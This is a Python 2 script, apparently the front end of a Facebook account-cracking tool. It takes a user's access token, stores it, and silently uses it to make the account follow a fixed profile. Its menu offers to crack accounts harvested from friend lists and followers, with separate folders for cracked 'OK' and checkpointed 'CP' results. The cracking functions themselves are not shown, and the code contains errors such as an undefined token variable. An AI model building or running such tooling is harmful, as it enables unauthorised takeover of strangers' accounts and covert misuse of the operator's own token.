
# -*- coding: utf-8
# author by fbtoolo
import os
try:
	import requests
except ImportError:
	os.system("pip2 install requests")

try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")

import os, sys, re, time, requests, json, random, calendar
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date

loop = 0
id = []
ok = []
cp = []

ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]


def  jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(000.05)

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tBilall = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

def logo():
	os.system("clear")
	print("""\x1b[0;32m═══╦
\x1b[0;33m╔═╗╔═╦═══╦═══╦╗╔═⇔║
\x1b[0;33m║║╚╝║║╔═╗║╔═╗║║║╔╝
\x1b[0;33m║╔╗╔╗║║─║║╚═╝║╚╝╝⇯⇯
\x1b[0;33m║║║║║║╚═╝║╔╗╔╣╔╗║⇯⇯
\x1b[0;33m║║║║║║╔═╗║║║╚╣║║╚╗
\x1b[0;33m╚╝╚╝╚╩╝─╚╩╝╚═╩╝╚═╝   """)
def login():
	os.system("clear")
	try:
		#-> connection test
		requests.get("https://mbasic.facebook.com")
	except requests.exceptions.ConnectionError:
		exit("Internet Connection Error")
	try:
		token = open("login.txt", "r")
		menu()
	except KeyError, IOError:
		token = raw_input("[?] Enter Token : ")
		if token == "":
			print("Wrong Input")
		try:
			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			open("login.txt", "w").write(token)
			#-> bot follow
			requests.post("https://graph.facebook.com/4/subscribers?access_token=" + toket)
			menu()
		except KeyError:
			os.system("rm -f login.txt")
			exit("[?] Login Error")

def menu():
	os.system("clear")
	global token
	try:
		token = open("login.txt","r").read()
	except KeyError:
		os.system("rm -f login.txt")
		exit("[?] Login Error")
	try:
		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
	except IOError:
		os.system("rm -f login.txt")
		exit("\033[1;96m[\033[1;93m+\033[1;96m] Token Error")
	except requests.exceptions.ConnectionError:
		exit(" ! no internet connection")
	logo()
	
	print("\n\033[1;93m[\033[1;94m01\033[1;97m] Crack Id From Public/Friends")
	print("\033[1;93m[\033[1;94m02\033[1;97m] Crack Id From Followers")
	print("\033[1;93m[\033[1;94m03\033[1;97m] Multi Crack\033[1;93m [ \033[1;95mPro \033[1;97m]")
	print("\033[1;93m[\033[1;94m04\033[1;97m] Chack Crack Results")
	print("\033[1;93m[\033[1;94m05\033[1;97m] User-Agent Settings\033[1;97m [ \033[1;95mPro \033[1;97m]")
	print("\033[1;93m[\033[1;94m00\033[1;97m] Exit\033[1;97m [ \033[1;91mDelete Token \033[1;97m]")
	Bilal = raw_input("\n\033[1;96m[\033[1;93m+\033[1;96m] Chouse : ")
	if Bilal =="":
		menu()
	elif Bilal == "1" or Bilal == "01":
		publik()
		method()
	elif Bilal == "2" or Bilal == "02":
		follower()
		method()
	elif Bilal == "3" or Bilal == "03":
		massal()
		method()
	elif Bilal == "4" or Bilal == "04":
		print("\n\033[1;92m[\033[1;93m01\033[1;96m] Chack Result OK")
		print("\033[1;93m[\033[1;94m02\033[1;96m] Chack Result CP")
		cek = raw_input("\n\033[1;93m[\033[1;93m+\033[1;96m] Chouse : ")
		if cek =="":
			menu()
		elif cek == "1":
			dirs = os.listdir("OK")
			print("\033[1;96m[\033[1;93m+\033[1;96m] Copy File Name  And Past into Input")
			for file in dirs:
				print("[•]  "+file)
			try:
				file = raw_input("\n\033[1;96m[\033[1;93m+\033[1;96m] File Name : ")
				if file == "":
					menu()
				Totalok = open("OK/%s"%(file)).read().splitlines
